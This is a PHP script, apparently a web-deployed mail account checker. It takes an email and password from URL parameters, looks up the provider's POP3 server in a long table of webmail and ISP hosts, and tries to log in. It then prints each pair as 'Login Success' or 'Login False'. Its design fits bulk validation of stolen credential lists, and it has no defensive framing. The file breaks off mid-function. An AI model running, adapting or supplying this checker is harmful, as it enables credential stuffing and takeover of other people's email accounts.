<?php
set_time_limit(0);
if(isset($_GET['mail'], $_GET['pass'])){
ini_set('memory_limit', '10000M'); //Raise to 512 MB	
@ini_set("display_errors","Off");
class pop3_class
{
    var $hostname="";
    var $port=110;
    var $tls=0;
    var $quit_handshake=1;
    var $error="";
    var $authentication_mechanism="USER";
    var $realm="";
    var $workstation="";
    var $join_continuation_header_lines=1;
    /* Private variables - DO NOT ACCESS */
    var $connection=0;
    var $state="DISCONNECTED";
    var $greeting="";
    var $must_update=0;
    var $debug=0;
    var $html_debug=0;
    var $next_token="";
    var $message_buffer="";
    var $connection_name = '';
    /* Private methods - DO NOT CALL */
    Function Tokenize($string,$separator="")
    {
        if(!strcmp($separator,""))
        {
            $separator=$string;
            $string=$this->next_token;
        }
        for($character=0;$character<strlen($separator);$character++)
        {
            if(GetType($position=strpos($string,$separator[$character]))=="integer")
                $found=(IsSet($found) ? min($found,$position) : $position);
        }
        if(IsSet($found))
        {
            $this->next_token=substr($string,$found+1);
            return(substr($string,0,$found));
        }
        else
        {
            $this->next_token="";
            return($string);
        }
    }
    Function SetError($error)
    {
        return($this->error=$error);
    }
    Function OutputDebug($message)
    {
        $message.="\n";
        if($this->html_debug)
            $message=str_replace("\n","<br />\n",HtmlSpecialChars($message));
        echo $message;
        flush();
    }
    Function GetLine()
    {
        for($line="";;)
        {
            if(feof($this->connection))
                return(0);
            $line.=fgets($this->connection,100);
            $length=strlen($line);
            if($length>=2
            && substr($line,$length-2,2)=="\r\n")
            {
                $line=substr($line,0,$length-2);
                if($this->debug)
                    $this->OutputDebug("S $line");
                return($line);
            }
        }
    }
    Function PutLine($line)
    {
        if($this->debug)
            $this->OutputDebug("C $line");
        return(fputs($this->connection,"$line\r\n"));
    }
    Function OpenConnection()
    {
        if($this->tls)
        {
            $version=explode(".",function_exists("phpversion") ? phpversion() : "3.0.7");
            $php_version=intval($version[0])*1000000+intval($version[1])*1000+intval($version[2]);
            if($php_version<4003000)
                return("establishing TLS connections requires at least PHP version 4.3.0");
            if(!function_exists("extension_loaded")
            || !extension_loaded("openssl"))
                return("establishing TLS connections requires the OpenSSL extension enabled");
        }
        if($this->hostname=="")
            return($this->SetError("2 it was not specified a valid hostname"));
        if($this->debug)
            $this->OutputDebug("Connecting to ".$this->hostname." ...");
        if(($this->connection=@fsockopen(($this->tls ? "tls://" : "").$this->hostname, $this->port, $error, $error_message))==0)
        {
            switch($error)
            {
                case -3:
                    return($this->SetError("-3 socket could not be created"));
                case -4:
                    return($this->SetError("-4 dns lookup on hostname \"$hostname\" failed"));
                case -5:
                    return($this->SetError("-5 connection refused or timed out"));
                case -6:
                    return($this->SetError("-6 fdopen() call failed"));
                case -7:
                    return($this->SetError("-7 setvbuf() call failed"));
                default:
                    return($this->SetError($error." could not connect to the host \"".$this->hostname."\": ".$error_message));
            }
        }
        return("");
    }
    Function CloseConnection()
    {
        if($this->debug)
            $this->OutputDebug("Closing connection.");
        if($this->connection!=0)
        {
            fclose($this->connection);
            $this->connection=0;
        }
    }
    /* Public methods */
    /* Open method - set the object variable $hostname to the POP3 server address. */
    Function Open()
    {
        if($this->state!="DISCONNECTED")
            return($this->SetError("1 a connection is already opened"));
        if(($error=$this->OpenConnection())!="")
            return($error);
        $greeting=$this->GetLine();
        if(GetType($greeting)!="string"
        || $this->Tokenize($greeting," ")!="+OK")
        {
            $this->CloseConnection();
            return($this->SetError("3 POP3 server greeting was not found"));
        }
        $this->Tokenize("<");
        $this->greeting = $this->Tokenize(">");
        $this->must_update=0;
        $this->state="AUTHORIZATION";
        return("");
    }
    /* Close method - this method must be called at least if there are any
     messages to be deleted */
    Function Close()
    {
        if($this->state=="DISCONNECTED")
            return($this->SetError("no connection was opened"));
        while($this->state=='GETMESSAGE')
        {
            if(strlen($error=$this->GetMessage(8000, $message, $end_of_message)))
                return($error);
        }
        if($this->must_update
        || $this->quit_handshake)
        {
            if($this->PutLine("QUIT")==0)
                return($this->SetError("Could not send the QUIT command"));
            $response=$this->GetLine();
            if(GetType($response)!="string")
                return($this->SetError("Could not get quit command response"));
            if($this->Tokenize($response," ")!="+OK")
                return($this->SetError("Could not quit the connection: ".$this->Tokenize("\r\n")));
        }
        $this->CloseConnection();
        $this->state="DISCONNECTED";
        pop3_class::SetConnection(-1, $this->connection_name, $this);
        return("");
    }
    /* Login method - pass the user name and password of POP account.  Set
     $apop to 1 or 0 wether you want to login using APOP method or not.  */
    Function Login($user,$password,$apop=0)
    {
        if($this->state!="AUTHORIZATION")
            return($this->SetError("connection is not in AUTHORIZATION state"));
        if($apop)
        {
            if(!strcmp($this->greeting,""))
                return($this->SetError("Server does not seem to support APOP authentication"));
            if($this->PutLine("APOP $user ".md5("<".$this->greeting.">".$password))==0)
                return($this->SetError("Could not send the APOP command"));
            $response=$this->GetLine();
            if(GetType($response)!="string")
                return($this->SetError("Could not get APOP login command response"));
            if($this->Tokenize($response," ")!="+OK")
                return($this->SetError("APOP login failed: ".$this->Tokenize("\r\n")));
        }
        else
        {
            $authenticated=0;
            if(strcmp($this->authentication_mechanism,"USER")
            && function_exists("class_exists")
            && class_exists("sasl_client_class"))
            {
                if(strlen($this->authentication_mechanism))
                    $mechanisms=array($this->authentication_mechanism);
                else
                {
                    $mechanisms=array();
                    if($this->PutLine("CAPA")==0)
                        return($this->SetError("Could not send the CAPA command"));
                    $response=$this->GetLine();
                    if(GetType($response)!="string")
                        return($this->SetError("Could not get CAPA command response"));
                    if(!strcmp($this->Tokenize($response," "),"+OK"))
                    {
                        for(;;)
                        {
                            $response=$this->GetLine();
                            if(GetType($response)!="string")
                                return($this->SetError("Could not retrieve the supported authentication methods"));
                            switch($this->Tokenize($response," "))
                            {
                                case ".":
                                    break 2;
                                case "SASL":
                                    for($method=1;strlen($mechanism=$this->Tokenize(" "));$method++)
                                        $mechanisms[]=$mechanism;
                                    break;
                            }
                        }
                    }
                }
                $sasl=new sasl_client_class;
                $sasl->SetCredential("user",$user);
                $sasl->SetCredential("password",$password);
                if(strlen($this->realm))
                    $sasl->SetCredential("realm",$this->realm);
                if(strlen($this->workstation))
                    $sasl->SetCredential("workstation",$this->workstation);
                do
                {
                    $status=$sasl->Start($mechanisms,$message,$interactions);
                }
                while($status==SASL_INTERACT);
                switch($status)
                {
                    case SASL_CONTINUE:
                        break;
                    case SASL_NOMECH:
                        if(strlen($this->authentication_mechanism))
                            return($this->SetError("authenticated mechanism ".$this->authentication_mechanism." may not be used: ".$sasl->error));
                        break;
                    default:
                        return($this->SetError("Could not start the SASL authentication client: ".$sasl->error));
                }
                if(strlen($sasl->mechanism))
                {
                    if($this->PutLine("AUTH ".$sasl->mechanism.(IsSet($message) ? " ".base64_encode($message) : ""))==0)
                        return("Could not send the AUTH command");
                    $response=$this->GetLine();
                    if(GetType($response)!="string")
                        return("Could not get AUTH command response");
                    switch($this->Tokenize($response," "))
                    {
                        case "+OK":
                            $response="";
                            break;
                        case "+":
                            $response=base64_decode($this->Tokenize("\r\n"));
                            break;
                        default:
                            return($this->SetError("Authentication error: ".$this->Tokenize("\r\n")));
                    }
                    for(;!$authenticated;)
                    {
                        do
                        {
                            $status=$sasl->Step($response,$message,$interactions);
                        }
                        while($status==SASL_INTERACT);
                        switch($status)
                        {
                            case SASL_CONTINUE:
                                if($this->PutLine(base64_encode($message))==0)
                                    return("Could not send message authentication step message");
                                $response=$this->GetLine();
                                if(GetType($response)!="string")
                                    return("Could not get authentication step message response");
                                switch($this->Tokenize($response," "))
                                {
                                    case "+OK":
                                        $authenticated=1;
                                        break;
                                    case "+":
                                        $response=base64_decode($this->Tokenize("\r\n"));
                                        break;
                                    default:
                                        return($this->SetError("Authentication error: ".$this->Tokenize("\r\n")));
                                }
                                break;
                            default:
                                return($this->SetError("Could not process the SASL authentication step: ".$sasl->error));
                        }
                    }
                }
            }
            if(!$authenticated)
            {
                if($this->PutLine("USER $user")==0)
                    return($this->SetError("Could not send the USER command"));
                $response=$this->GetLine();
                if(GetType($response)!="string")
                    return($this->SetError("Could not get user login entry response"));
                if($this->Tokenize($response," ")!="+OK")
                    return($this->SetError("User error: ".$this->Tokenize("\r\n")));
                if($this->PutLine("PASS $password")==0)
                    return($this->SetError("Could not send the PASS command"));
                $response=$this->GetLine();
                if(GetType($response)!="string")
                    return($this->SetError("Could not get login password entry response"));
                if($this->Tokenize($response," ")!="+OK")
                    return($this->SetError("Password error: ".$this->Tokenize("\r\n")));
            }
        }
        $this->state="TRANSACTION";
        return("");
    }
    /* Statistics method - pass references to variables to hold the number of
     messages in the mail box and the size that they take in bytes.  */
    Function Statistics(&$messages,&$size)
    {
        if($this->state!="TRANSACTION")
            return($this->SetError("connection is not in TRANSACTION state"));
        if($this->PutLine("STAT")==0)
            return($this->SetError("Could not send the STAT command"));
        $response=$this->GetLine();
        if(GetType($response)!="string")
            return($this->SetError("Could not get the statistics command response"));
        if($this->Tokenize($response," ")!="+OK")
            return($this->SetError("Could not get the statistics: ".$this->Tokenize("\r\n")));
        $messages=$this->Tokenize(" ");
        $size=$this->Tokenize(" ");
        return("");
    }
    /* ListMessages method - the $message argument indicates the number of a
     message to be listed.  If you specify an empty string it will list all
     messages in the mail box.  The $unique_id flag indicates if you want
     to list the each message unique identifier, otherwise it will
     return the size of each message listed.  If you list all messages the
     result will be returned in an array. */
    Function ListMessages($message,$unique_id)
    {
        if($this->state!="TRANSACTION")
            return($this->SetError("connection is not in TRANSACTION state"));
        if($unique_id)
            $list_command="UIDL";
        else
            $list_command="LIST";
        if($this->PutLine("$list_command".($message ? " ".$message : ""))==0)
            return($this->SetError("Could not send the $list_command command"));
        $response=$this->GetLine();
        if(GetType($response)!="string")
            return($this->SetError("Could not get message list command response"));
        if($this->Tokenize($response," ")!="+OK")
            return($this->SetError("Could not get the message listing: ".$this->Tokenize("\r\n")));
        if($message=="")
        {
            for($messages=array();;)
            {
                $response=$this->GetLine();
                if(GetType($response)!="string")
                    return($this->SetError("Could not get message list response"));
                if($response==".")
                    break;
                $message=intval($this->Tokenize($response," "));
                if($unique_id)
                    $messages[$message]=$this->Tokenize(" ");
                else
                    $messages[$message]=intval($this->Tokenize(" "));
            }
            return($messages);
        }
        else
        {
            $message=intval($this->Tokenize(" "));
            $value=$this->Tokenize(" ");
            return($unique_id ? $value : intval($value));
        }
    }
    /* RetrieveMessage method - the $message argument indicates the number of
     a message to be listed.  Pass a reference variables that will hold the
     arrays of the $header and $body lines.  The $lines argument tells how
     many lines of the message are to be retrieved.  Pass a negative number
     if you want to retrieve the whole message. */
    Function RetrieveMessage($message,&$headers,&$body,$lines)
    {
        if($this->state!="TRANSACTION")
            return($this->SetError("connection is not in TRANSACTION state"));
        if($lines<0)
        {
            $command="RETR";
            $arguments="$message";
        }
        else
        {
            $command="TOP";
            $arguments="$message $lines";
        }
        if($this->PutLine("$command $arguments")==0)
            return($this->SetError("Could not send the $command command"));
        $response=$this->GetLine();
        if(GetType($response)!="string")
            return($this->SetError("Could not get message retrieval command response"));
        if($this->Tokenize($response," ")!="+OK")
            return($this->SetError("Could not retrieve the message: ".$this->Tokenize("\r\n")));
        for($headers=$body=array(),$line=0;;)
        {
            $response=$this->GetLine();
            if(GetType($response)!="string")
                return($this->SetError("Could not retrieve the message"));
            switch($response)
            {
                case ".":
                    return("");
                case "":
                    break 2;
                default:
                    if(substr($response,0,1)==".")
                        $response=substr($response,1,strlen($response)-1);
                    break;
            }
            if($this->join_continuation_header_lines
            && $line>0
            && ($response[0]=="\t"
            || $response[0]==" "))
                $headers[$line-1].=$response;
            else
            {
                $headers[$line]=$response;
                $line++;
            }
        }
        for($line=0;;$line++)
        {
            $response=$this->GetLine();
            if(GetType($response)!="string")
                return($this->SetError("Could not retrieve the message"));
            switch($response)
            {
                case ".":
                    return("");
                default:
                    if(substr($response,0,1)==".")
                        $response=substr($response,1,strlen($response)-1);
                    break;
            }
            $body[$line]=$response;
        }
        return("");
    }
    /* OpenMessage method - the $message argument indicates the number of
     a message to be opened. The $lines argument tells how many lines of
     the message are to be retrieved.  Pass a negative number if you want
     to retrieve the whole message. */
    Function OpenMessage($message, $lines=-1)
    {
        if($this->state!="TRANSACTION")
            return($this->SetError("connection is not in TRANSACTION state"));
        if($lines<0)
        {
            $command="RETR";
            $arguments="$message";
        }
        else
        {
            $command="TOP";
            $arguments="$message $lines";
        }
        if($this->PutLine("$command $arguments")==0)
            return($this->SetError("Could not send the $command command"));
        $response=$this->GetLine();
        if(GetType($response)!="string")
            return($this->SetError("Could not get message retrieval command response"));
        if($this->Tokenize($response," ")!="+OK")
            return($this->SetError("Could not retrieve the message: ".$this->Tokenize("\r\n")));
        $this->state="GETMESSAGE";
        $this->message_buffer="";
        return("");
    }
    /* GetMessage method - the $count argument indicates the number of bytes
     to be read from an opened message. The $message returns by reference
     the data read from the message. The $end_of_message argument returns
     by reference a boolean value indicated whether it was reached the end
     of the message. */
    Function GetMessage($count, &$message, &$end_of_message)
    {
        if($this->state!="GETMESSAGE")
            return($this->SetError("connection is not in GETMESSAGE state"));
        $message="";
        $end_of_message=0;
        while($count>strlen($this->message_buffer)
        && !$end_of_message)
        {
            $response=$this->GetLine();
            if(GetType($response)!="string")
                return($this->SetError("Could not retrieve the message headers"));
            if(!strcmp($response,"."))
            {
                $end_of_message=1;
                $this->state="TRANSACTION";
                break;
            }
            else
            {
                if(substr($response,0,1)==".")
                    $response=substr($response,1,strlen($response)-1);
                $this->message_buffer.=$response."\r\n";
            }
        }
        if($end_of_message
        || $count>=strlen($this->message_buffer))
        {
            $message=$this->message_buffer;
            $this->message_buffer="";
        }
        else
        {
            $message=substr($this->message_buffer, 0, $count);
            $this->message_buffer=substr($this->message_buffer, $count);
        }
        return("");
    }
    /* DeleteMessage method - the $message argument indicates the number of
     a message to be marked as deleted.  Messages will only be effectively
     deleted upon a successful call to the Close method. */
    Function DeleteMessage($message)
    {
        if($this->state!="TRANSACTION")
            return($this->SetError("connection is not in TRANSACTION state"));
        if($this->PutLine("DELE $message")==0)
            return($this->SetError("Could not send the DELE command"));
        $response=$this->GetLine();
        if(GetType($response)!="string")
            return($this->SetError("Could not get message delete command response"));
        if($this->Tokenize($response," ")!="+OK")
            return($this->SetError("Could not delete the message: ".$this->Tokenize("\r\n")));
        $this->must_update=1;
        return("");
    }
    /* ResetDeletedMessages method - Reset the list of marked to be deleted
     messages.  No messages will be marked to be deleted upon a successful
     call to this method.  */
    Function ResetDeletedMessages()
    {
        if($this->state!="TRANSACTION")
            return($this->SetError("connection is not in TRANSACTION state"));
        if($this->PutLine("RSET")==0)
            return($this->SetError("Could not send the RSET command"));
        $response=$this->GetLine();
        if(GetType($response)!="string")
            return($this->SetError("Could not get reset deleted messages command response"));
        if($this->Tokenize($response," ")!="+OK")
            return($this->SetError("Could not reset deleted messages: ".$this->Tokenize("\r\n")));
        $this->must_update=0;
        return("");
    }
    /* IssueNOOP method - Just pings the server to prevent it auto-close the
     connection after an idle timeout (tipically 10 minutes).  Not very
     useful for most likely uses of this class.  It's just here for
     protocol support completeness.  */
    Function IssueNOOP()
    {
        if($this->state!="TRANSACTION")
            return($this->SetError("connection is not in TRANSACTION state"));
        if($this->PutLine("NOOP")==0)
            return($this->SetError("Could not send the NOOP command"));
        $response=$this->GetLine();
        if(GetType($response)!="string")
            return($this->SetError("Could not NOOP command response"));
        if($this->Tokenize($response," ")!="+OK")
            return($this->SetError("Could not issue the NOOP command: ".$this->Tokenize("\r\n")));
        return("");
    }
    Function &SetConnection($set, &$current_name, &$pop3)
    {
        static $connections = array();
        if($set>0)
        {
            $current_name = strval(count($connections));
            $connections[$current_name] = &$pop3;
        }
        elseif($set<0)
        {
            $connections[$current_name] = '';
            $current_name = '';
        }
        elseif(IsSet($connections[$current_name])
        && GetType($connections[$current_name])!='string')
        {
            $connection = &$connections[$current_name];
            return($connection);
        }
        return($pop3);
    }
    /* GetConnectionName method - Retrieve the name associated to an
       established POP3 server connection to use as virtual host name for
       use in POP3 stream wrapper URLs.  */
    Function GetConnectionName(&$connection_name)
    {
        if($this->state!="TRANSACTION")
            return($this->SetError("cannot get the name of a POP3 connection that was not established and the user has logged in"));
        if(strlen($this->connection_name) == 0)
            pop3_class::SetConnection(1, $this->connection_name, $this);
        $connection_name = $this->connection_name;
        return('');
    }
};
class pop3_stream
{
    var $opened = 0;
    var $report_errors = 1;
    var $read = 0;
    var $buffer = "";
    var $end_of_message=1;
    var $previous_connection = 0;
    var $pop3;
    Function SetError($error)
    {
        if($this->report_errors)
            trigger_error($error);
        return(FALSE);
    }
    Function ParsePath($path, &$url)
    {
        if(!$this->previous_connection)
        {
            if(IsSet($url["host"]))
                $this->pop3->hostname=$url["host"];
            if(IsSet($url["port"]))
                $this->pop3->port=intval($url["port"]);
            if(IsSet($url["scheme"])
            && !strcmp($url["scheme"],"pop3s"))
                $this->pop3->tls=1;
            if(!IsSet($url["user"]))
                return($this->SetError("it was not specified a valid POP3 user"));
            if(!IsSet($url["pass"]))
                return($this->SetError("it was not specified a valid POP3 password"));
            if(!IsSet($url["path"]))
                return($this->SetError("it was not specified a valid mailbox path"));
        }
        if(IsSet($url["query"]))
        {
            parse_str($url["query"],$query);
            if(IsSet($query["debug"]))
                $this->pop3->debug = intval($query["debug"]);
            if(IsSet($query["html_debug"]))
                $this->pop3->html_debug = intval($query["html_debug"]);
            if(!$this->previous_connection)
            {
                if(IsSet($query["tls"]))
                    $this->pop3->tls = intval($query["tls"]);
                if(IsSet($query["realm"]))
                    $this->pop3->realm = UrlDecode($query["realm"]);
                if(IsSet($query["workstation"]))
                    $this->pop3->workstation = UrlDecode($query["workstation"]);
                if(IsSet($query["authentication_mechanism"]))
                    $this->pop3->realm = UrlDecode($query["authentication_mechanism"]);
            }
            if(IsSet($query["quit_handshake"]))
                $this->pop3->quit_handshake = intval($query["quit_handshake"]);
        }
        return(TRUE);
    }
    Function stream_open($path, $mode, $options, &$opened_path)
    {
        $this->report_errors = (($options & STREAM_REPORT_ERRORS) !=0);
        if(strcmp($mode, "r"))
            return($this->SetError("the message can only be opened for reading"));
        $url=parse_url($path);
        $host = $url['host'];
        $pop3 = &pop3_class::SetConnection(0, $host, $this->pop3);
        if(IsSet($pop3))
        {
            $this->pop3 = &$pop3;
            $this->previous_connection = 1;
        }
        else
            $this->pop3=new pop3_class;
        if(!$this->ParsePath($path, $url))
            return(FALSE);
        $message=substr($url["path"],1);
        if(strcmp(intval($message), $message)
        || $message<=0)
            return($this->SetError("it was not specified a valid message to retrieve"));
        if(!$this->previous_connection)
        {
            if(strlen($error=$this->pop3->Open()))
                return($this->SetError($error));
            $this->opened = 1;
            $apop = (IsSet($url["query"]["apop"]) ? intval($url["query"]["apop"]) : 0);
            if(strlen($error=$this->pop3->Login(UrlDecode($url["user"]), UrlDecode($url["pass"]),$apop)))
            {
                $this->stream_close();
                return($this->SetError($error));
            }
        }
        if(strlen($error=$this->pop3->OpenMessage($message,-1)))
        {
            $this->stream_close();
            return($this->SetError($error));
        }
        $this->end_of_message=FALSE;
        if($options & STREAM_USE_PATH)
            $opened_path=$path;
        $this->read = 0;
        $this->buffer = "";
        return(TRUE);
    }
    Function stream_eof()
    {
        if($this->read==0)
            return(FALSE);
        return($this->end_of_message);
    }
    Function stream_read($count)
    {
        if($count<=0)
            return($this->SetError("it was not specified a valid length of the message to read"));
        if($this->end_of_message)
            return("");
        if(strlen($error=$this->pop3->GetMessage($count, $read, $this->end_of_message)))
            return($this->SetError($error));
        $this->read += strlen($read);
        return($read);
    }
    Function stream_close()
    {
        while(!$this->end_of_message)
            $this->stream_read(8000);
        if($this->opened)
        {
            $this->pop3->Close();
            $this->opened = 0;
        }
    }
}

global $mail_config;
    $mail_config[] = array(".edu", "pop.googlemail.com", "995", "1");
    $mail_config[] = array("gmail.com", "pop.googlemail.com", "995", "1");
    $mail_config[] = array("aol.com", "pop.aol.com", "995", "1");
    $mail_config[] = array("yahoo", "pop.mail.yahoo.com", "995", "1");
    $mail_config[] = array("ymail", "pop.mail.yahoo.com", "995", "1");
    $mail_config[] = array("rocketmail", "pop.mail.yahoo.com", "995", "1");
    $mail_config[] = array("mho.com", "pop3.mho.com", "995", "1");
    $mail_config[] = array("mho.net", "pop3.mho.net", "995", "1");
    $mail_config[] = array("hotmail", "pop3.live.com", "995", "1");
    $mail_config[] = array("msn", "pop3.live.com", "995", "1");
    $mail_config[] = array("live", "pop3.live.com", "995", "1");
    $mail_config[] = array("att.net", "pop.att.yahoo.com", "995", "1");
    $mail_config[] = array("sbcglobal.net", "pop.att.yahoo.com", "995", "1");
    $mail_config[] = array("snet.net", "pop.att.yahoo.com", "995", "1");
    $mail_config[] = array("verizon", "incoming.verizon.net", "110", "0");
    $mail_config[] = array("1and1", "pop.1and1.com", "110", "0");
    $mail_config[] = array("adelphia.net", "mail.adelphia.net", "110", "0");
    $mail_config[] = array("airmail.net", "pop3.airmail.net", "110", "0");
    $mail_config[] = array("bellsouth", "mail.bellsouth.net", "110", "0");
    $mail_config[] = array("mail.com", "pop1.mail.com", "110", "0");
    $mail_config[] = array("optusnet.com.au", "mail.optusnet.com.au", "110", "0");
    $mail_config[] = array("bigpond.net.au", "pop-server.bigpond.net.au", "110", "0");
    $mail_config[] = array("tpg.com.au", "mail.tpg.com.au", "110", "0");
    $mail_config[] = array("blueyonder.co.uk", "pop3.blueyonder.co.uk", "110", "1");
    $mail_config[] = array("wanadoo.fr", "pop.wanadoo.fr", "110", "0");
    $mail_config[] = array("cox.net", "pop.west.cox.net", "995 ", "1");
    $mail_config[] = array("juno.com", "pop.juno.com", "110", "0");
    $mail_config[] = array("charter.net", "pop.charter.net", "110", "0");
    $mail_config[] = array("pacbell", "pop.pacbell.yahoo.com", "110", "1");
    $mail_config[] = array("grandecom.net", "mail.grandecom.net", "110", "0");
    $mail_config[] = array("comcast.net", "mail.comcast.net", "110", "0");
    $mail_config[] = array("stx.rr.com", "pop-server.stx.rr.com", "110", "0");
    $mail_config[] = array("bham.rr.com", "pop-server.bham.rr.com", "110", "0");
    $mail_config[] = array("sw.rr.com", "pop-server.sw.rr.com", "110", "0");
    $mail_config[] = array("elmore.rr.com", "pop-server.elmore.rr.com", "110", "0");
    $mail_config[] = array("eufaula.rr.com", "pop-server.eufaula.rr.com", "110", "0");
    $mail_config[] = array("bak.rr.com", "pop-server.bak.rr.com", "110", "0");
    $mail_config[] = array("san.rr.com", "pop-server.san.rr.com", "110", "0");
    $mail_config[] = array("socal.rr.com", "pop-server.socal.rr.com", "110", "0");
    $mail_config[] = array("dc.rr.com", "pop-server.dc.rr.com", "110", "0");
    $mail_config[] = array("panhandle.rr.com", "pop-server.panhandle.rr.com", "110", "0");
    $mail_config[] = array("cfl.rr.com", "pop-server.cfl.rr.com", "110", "0");
    $mail_config[] = array("swfla.rr.com", "pop-server.swfla.rr.com", "110", "0");
    $mail_config[] = array("se.rr.com", "pop-server.se.rr.com", "110", "0");
    $mail_config[] = array("se.rr.com", "pop-server.se.rr.com", "110", "0");
    $mail_config[] = array("se.rr.com", "pop-server.se.rr.com", "110", "0");
    $mail_config[] = array("tampabay.rr.com", "pop-server.tampabay.rr.com", "110", "0");
    $mail_config[] = array("sw.rr.com", "pop-server.sw.rr.com", "110", "0");
    $mail_config[] = array("hawaii.rr.com", "pop-server.hawaii.rr.com", "110", "0");
    $mail_config[] = array("indy.rr.com", "pop-server.indy.rr.com", "110", "0");
    $mail_config[] = array("ma.rr.com", "pop-server.ma.rr.com", "110", "0");
    $mail_config[] = array("kc.rr.com", "pop-server.kc.rr.com", "110", "0");
    $mail_config[] = array("we.rr.com", "pop-server.we.rr.com", "110", "0");
    $mail_config[] = array("sw.rr.com", "pop-server.sw.rr.com", "110", "0");
    $mail_config[] = array("sw.rr.com", "pop-server.sw.rr.com", "110", "0");
    $mail_config[] = array("jam.rr.com", "pop-server.jam.rr.com", "110", "0");
    $mail_config[] = array("sport.rr.com", "pop-server.sport.rr.com", "110", "0");
    $mail_config[] = array("maine.rr.com", "pop-server.maine.rr.com", "110", "0");
    $mail_config[] = array("mass.rr.com", "pop-server.mass.rr.com", "110", "0");
    $mail_config[] = array("berkshire.rr.com", "pop-server.berkshire.rr.com", "110", "0");
    $mail_config[] = array("twmi.rr.com", "pop-server.twmi.rr.com", "110", "0");
    $mail_config[] = array("mn.rr.com", "pop-server.mn.rr.com", "110", "0");
    $mail_config[] = array("jam.rr.com", "pop-server.jam.rr.com", "110", "0");
    $mail_config[] = array("kc.rr.com", "pop-server.kc.rr.com", "110", "0");
    $mail_config[] = array("neb.rr.com", "pop-server.neb.rr.com", "110", "0");
    $mail_config[] = array("ne.rr.com", "pop-server.ne.rr.com", "110", "0");
    $mail_config[] = array("nj.rr.com", "pop-server.nj.rr.com", "110", "0");
    $mail_config[] = array("nycap.rr.com", "pop-server.nycap.rr.com", "110", "0");
    $mail_config[] = array("twcny.rr.com", "pop-server.twcny.rr.com", "110", "0");
    $mail_config[] = array("hvc.rr.com", "pop-server.hvc.rr.com", "110", "0");
    $mail_config[] = array("nyc.rr.com", "pop-server.nyc.rr.com", "110", "0");
    $mail_config[] = array("rochester.rr.com", "pop-server.rochester.rr.com", "110", "0");
    $mail_config[] = array("stny.rr.com", "pop-server.stny.rr.com", "110", "0");
    $mail_config[] = array("si.rr.com", "pop-server.si.rr.com", "110", "0");
    $mail_config[] = array("nc.rr.com", "pop-server.nc.rr.com", "110", "0");
    $mail_config[] = array("ec.rr.com", "pop-server.ec.rr.com", "110", "0");
    $mail_config[] = array("triad.rr.com", "pop-server.triad.rr.com", "110", "0");
    $mail_config[] = array("carolina.rr.com", "pop-server.carolina.rr.com", "110", "0");
    $mail_config[] = array("cinci.rr.com", "pop-server.cinci.rr.com", "110", "0");
    $mail_config[] = array("columbus.rr.com", "pop-server.columbus.rr.com", "110", "0");
    $mail_config[] = array("neo.rr.com", "pop-server.neo.rr.com", "110", "0");
    $mail_config[] = array("woh.rr.com", "pop-server.woh.rr.com", "110", "0");
    $mail_config[] = array("ma.rr.com", "pop-server.ma.rr.com", "110", "0");
    $mail_config[] = array("ucwphilly.rr.com", "pop-server.ucwphilly.rr.com", "110", "0");
    $mail_config[] = array("carolina.rr.com", "pop-server.carolina.rr.com", "110", "0");
    $mail_config[] = array("midsouth.rr.com", "pop-server.midsouth.rr.com", "110", "0");
    $mail_config[] = array("austin.rr.com", "pop-server.austin.rr.com", "110", "0");
    $mail_config[] = array("elp.rr.com", "pop-server.elp.rr.com", "110", "0");
    $mail_config[] = array("houston.rr.com", "pop-server.houston.rr.com", "110", "0");
    $mail_config[] = array("rgv.rr.com", "pop-server.rgv.rr.com", "110", "0");
    $mail_config[] = array("satx.rr.com", "pop-server.satx.rr.com", "110", "0");
    $mail_config[] = array("hot.rr.com", "pop-server.hot.rr.com", "110", "0");
    $mail_config[] = array("gt.rr.com", "pop-server.gt.rr.com", "110", "0");
    $mail_config[] = array("stx.rr.com", "pop-server.stx.rr.com", "110", "0");
    $mail_config[] = array("sw.rr.com", "pop-server.sw.rr.com", "110", "0");
    $mail_config[] = array("ma.rr.com", "pop-server.ma.rr.com", "110", "0");
    $mail_config[] = array("wi.rr.com", "pop-server.wi.rr.com", "110", "0");
    $mail_config[] = array("new.rr.com", "pop-server.new.rr.com", "110", "0");
    $mail_config[] = array("rr.com", "pop-server.roadrunner.com", "110", "0");
    $mail_config[] = array("mac.com", "mail.me.com", "995", "1");
    $mail_config[] = array("me.com", "mail.me.com", "995", "1");    
    $mail_config[] = array(".net", "pop.googlemail.com", "995", "1");
    $mail_config[] = array(".us", "pop.googlemail.com", "995", "1");
    $mail_config[] = array(".info", "pop.googlemail.com", "995", "1");
    $mail_config[] = array(".com", "pop.googlemail.com", "995", "1");
    $mail_config[] = array(".gov", "pop.googlemail.com", "995", "1");
    $mail_config[] = array(".uk", "pop.googlemail.com", "995", "1");
    $mail_config[] = array(".au", "pop.googlemail.com", "995", "1");
    $mail_config[] = array(".", "pop.googlemail.com", "995", "1");
$debug = false;

                
                
                Function mail_config($domain)
    {
        global $mail_config;
        $found = false;
        $key = -1;
        foreach ($mail_config as $k => $v)
        {
            if (stristr($domain, $v[0]))
            {
                $key = $k;
                $found = true;
                break;
            }
        }
        unset($k);
        unset($v);
        return $key;
    }
    
    function check($mail,$pass, $try = true, $tls = '')
    {
        global $mail_config,$split,$debug;
        global $array_ls;
        if (preg_match('/^[^@]+@([a-zA-Z0-9._-]+\.[a-zA-Z]+)$/', $mail, $match))
        {
            $domain = $match[1];
            $mail_config_id = mail_config($domain);
            if ($mail_config_id > -1)
            {
                $pop3=new pop3_class;
                $pop3->realm="";
                $pop3->workstation="";
                $pop3->authentication_mechanism="USER";
                $pop3->debug=0;
                $pop3->html_debug=0;
                $pop3->join_continuation_header_lines=1;
                $apop=0;
                $pop3->hostname=$mail_config[$mail_config_id][1];
                $pop3->port=$mail_config[$mail_config_id][2];
                if ($try) {
                    $pop3->tls=$mail_config[$mail_config_id][3];
                } else {
                    $pop3->tls = $tls;
                }
                if(($error=$pop3->Open())=="")
                {
                    $error=$pop3->Login($mail,$pass,$apop);
                    if($error=="" || stristr($error, "pop not allowed for user") || stristr($error, "Web login required"))
                    {
                        echo $result = "| $mail | $pass | Login Success";
						
						return true;
                    }
					
                    elseif(stristr($error, "Password error"))
                    {
						echo $result = "| $mail | $pass | Login False";
						
                        return false; // die
                    }
                    else
                    {
                        if ($debug)
                        {
                            $result = "$error";
                        }
                        else
                        {
                            $result = "Unknown error";
                        }
                    }
                    $error=$pop3->Close();
                }
                else
                {
                    if ($try) {
                        if ($pop3->tls == "1") {
                            $tls = "0";
                        } else {
                            $tls = "1";
                        }
                        $result = check($mail,$pass, false, $tls);
                    } else {
                        $result = "Cannot Connect";
                    }
                }
            }
            else
            {
